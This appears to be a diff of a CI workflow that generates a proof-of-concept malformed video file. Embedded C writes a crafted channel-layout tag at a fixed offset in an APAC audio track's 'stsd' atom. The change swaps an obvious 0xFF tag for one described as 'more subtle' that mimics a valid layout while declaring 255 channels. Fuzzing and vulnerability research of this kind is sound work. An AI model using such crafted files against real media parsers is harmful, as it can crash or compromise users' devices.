@@ -87,8 +87,9 @@ jobs:
 
               fseek(file, offset, SEEK_SET);
               
-              // This is the specific malicious data for the channel layout tag
-              unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
+              // New, more subtle malicious tag. This looks like a valid layout
+              // but specifies 255 channels, creating a mismatch.
+              unsigned char malicious_tag[4] = {0x01, 0x01, 0x00, 0xFF};
               fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
               fclose(file);
               
@@ -124,7 +125,6 @@ jobs:
           cp IMG_1047.mov output_apac_poc.mp4
 
           # Step 2: Use the manually identified offset for the APAC track's 'stsd' atom.
-          # This value (3461 in decimal is 0xd85 in hex) comes from your analysis of the atom_dump.json.
           APAC_STSD_OFFSET=3461
           
           # The channel layout tag is at a known position within the 'stsd' atom.
